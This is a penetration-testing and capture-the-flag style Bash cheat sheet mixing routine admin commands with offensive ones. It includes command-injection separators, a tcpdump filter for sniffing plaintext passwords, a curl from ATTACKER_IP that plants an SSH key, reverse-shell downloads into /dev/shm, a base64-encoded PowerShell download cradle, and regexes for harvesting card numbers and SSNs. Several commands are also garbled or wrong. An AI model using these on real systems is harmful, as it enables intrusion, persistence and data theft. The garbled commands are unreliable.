# Bash Tricks

### Special Characters for Command Injection
The following special character can be used for command injection such as `|` `;` `&` `$` `>` `<` `'` `!`

* `cmd1|cmd2` : Uses of `|` will make command 2 to be executed whether command 1 execution is successful or not.
* `cmd1;cmd2` : Uses of `;` will make command 2 to be executed whether command 1 execution is successful or not.
* `cmd1||cmd2` : Command 2 will only be executed if command 1 execution fails.
* `cmd1&&cmd2` : Command 2 will only be executed if command 1 execution succeeds.
* `$(cmd)` : For example, `echo $(whoami)` or `$(touch test.sh; echo 'ls' > test.sh)`
* `cmd` : It’s used to execute a specific command. For example, `whoami`
* `>(cmd)` : `>(ls)`
* `<(cmd)` : `<(ls)`

### Code Review Dangerous API
Be aware of the uses of following API as it may introduce the command injection risks.

**Java**

    Runtime.exec()

**C/C++**

    system
    exec
    ShellExecute

**Python**

    exec
    eval
    os.system
    os.popen
    subprocess.popen
    subprocess.call

**PHP**

    system
    shell_exec
    exec
    proc_open
    eval

-----

### Generate random password
Generate a random password `18` characters long
```bash
tr -c -d 'a-zA-Z0-9~!@#$%^&*' </dev/urandom | dd bs=18 count=1 2>/dev/null;echo

```
### Generate SSH public key from the private key
```bash
ssh-keygen -y -f privatekey.pem > publickey.pem

```
### Capture all plaintext username and password
```bash
sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '

```
### Capture SMTP / POP3 Email
```bash
sudo tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'

```
### Port scan a range of hosts with Netcat
```bash
for i in {21..29}; do nc -v -n -z -w 1 192.168.0.$i 443; done

```
### Port scan all open ports without any required program
```bash
for i in {1..65535}; do (echo < /dev/tcp/192.168.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done

```

### Common Bash
```bash
#To find any abnormally running services, you can use
service --status-all

#Search command history on bash
Ctrl+r

#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz


#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker  

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob


#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd


#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

# List files inside zip
7z l file.zip
```

### Download in RAM
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
```

### Files used by network processes
```bash
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80
```

### Curl
```bash
#Check The Status of A Site
curl -Is http://domain.com | head -n 1

#Download A File Over SSH
curl -u root sftp://host.domain.com/path/to/file

#Verify If A Website Supports HTTP/2 With Curl
curl -I --http2 -s https://liquidweb.com/ | grep HTTP

#Need A QR Code? cURL
curl qrenco.de/mydomain.com

#Save URL content to a file
curl -o logo.png https://reqbin.com/static/img/logo.png

#Download multiple files at once
curl -O https://reqbin.com/static/img/code/curl.png 
   -O https://reqbin.com/static/img/code/java.png 
   -O https://reqbin.com/static/img/code/python.png

#Send data to the server
curl -d '{"id": 123456}'
   -H "Content-Type: application/json"
   https://reqbin.com/echo/post/json

#Download URLs From a File
xargs -n 1 curl -O < listurls.txt

#Store Website Cookies
curl --cookie-jar cnncookies.txt https://www.cnn.com/index.html -O

#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint

#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
```

### Send Email
```bash
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content
```


### ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
```bash
ssh-keyscan 10.10.10.101
```

### Openssl
```bash
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)

# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12

# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh

#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
```

### Count number of instructions executed by a program, need a host based linux (not working in VM)
```bash
perf stat -x, -e instructions:u "ls"
```

### Find trick for HTB, find files from 2018-12-12 to 2018-12-14
```bash
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
```

### Reconfigure timezone
```bash
sudo dpkg-reconfigure tzdata
```

### Search from which package is a binary
```bash
apt-file search /usr/bin/file #Needed: apt-get install apt-file
```


### Set not removable bit
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it
```

### Greps
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt

#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt

#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt

#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt

#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt

#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt

#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt

#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt

#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt

#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt

#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt

#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt

#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt

#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt

#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt

#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt

#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt

#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt

#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt

#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt

#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt

#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt

#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt

#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```

### Bash for Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
 
#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853  
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```


### Nmap search help
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```

### Iptables
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```


### Network Commands
```bash
#list the ARP cache entries
ip neigh
or
ip -s neigh

#flush all the entries ARP cache
sudo ip neigh flush all

#show all interfaces brief
ip -br a

#network communications
watch ss -tp 

#tcp or udp connections -anu=udp
netstat -ant

#connections along with PIDs
netstat -tulpn

#connection established
lsof -i 

#access to the shared environment smb
smb:// ip /share 

#mount the shared Windows environment
share user x.x.x.x c$ 

#share Connect to SMB
smbclient -0 user\ ip \ 

#set IP and netmask
ifconfig eth# ip cidr 

#virtual interface setup
ifconfig eth0:1 ip cidr 

#GW setting
route add default gw gw lp 

#change MAC
export MAC=xx: XX: XX: XX: XX: XX 

#change MAC
ifconfig int hw ether MAC 

#Mac changer
macchanger -m MAC int 

#wifi scanner
iwlist int scan 

#listen on specific port
nc -lvvp port 

#create a web server
python3 -m http.server port 

#identify the domains of an ip
dig -x ip 

#identify the domains of an ip
host ip 

#identifies the domain's SRV
host -t SRV _service tcp.url.com 

#identify DNS Zone Xfer
dig @ ip domain -t AXrR 

#identify DNS Zone Xfer
host -1 domain namesvr 

#blocking ip:port
tcpkill host ip and port port

#enable ip forwarding
echo "1" /proc/sys/net/ipv4/ip forward 

#show mounted points
showmount -e ip

#mount shared path ip
mkdir /site_backups;mount -t nfs ip:/ /site_backup 
```

### System Information
```bash
#Get hostname for ip
nbstate -A -ip

#Current username
id

#User is logged in
w

#User information
who -a

#The last logged in user
last -a

#available system processes (or use top)
ps -ef

#disk usage (or free usage)
df -h

#Display the kernel version along with the processor structure
uname -a

#Mount the file system
mount

#Show list of users
getent passwd

#Add variable to PATH
PATH~$PATH:/home/mypath

#kill process with pid
kill pid

#Display operating system information
cat /etc/issue

#display operating system version information
cat /etc/os-release

#Display kernel version information
cat /proc/version

#installed packages (in Redhat)
rpm –query -all

#install rpm packages (to remove -e=remove)
rpm -ivh '.rpm

#installed packages (on Ubuntu)
dpkg -get-selections

#install DEB packages (to remove -r=remove)
dpkg -I '.deb

#Installed packages (on Solaris)
pkginfo

#show executable file paths
which tscsh/csh/ksh/bash

#disables shell and also forces bash to be used
chmod -so tcsh/csh/ksh

#Finding files with suid
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

#Find files with suid
find / -uid 0 -perm -4000 -type f 2>/dev/null

#display writable files
find / -writable ! -user whoami -type f! -path “/proc/” ! -path “/sys/” -exec ls -al {} \; 2>/dev/null
```

### Bash for Bug Hunters!
```bash
# Create multiple folders using one-liner
mkdir {dev,test,prod}

# Create multiple files efficiently
touch {file1,file2,file3}.txt

# Generating files with numeric sequences
seq -w 1 10 | xargs -I {} touch file{}.txt

```





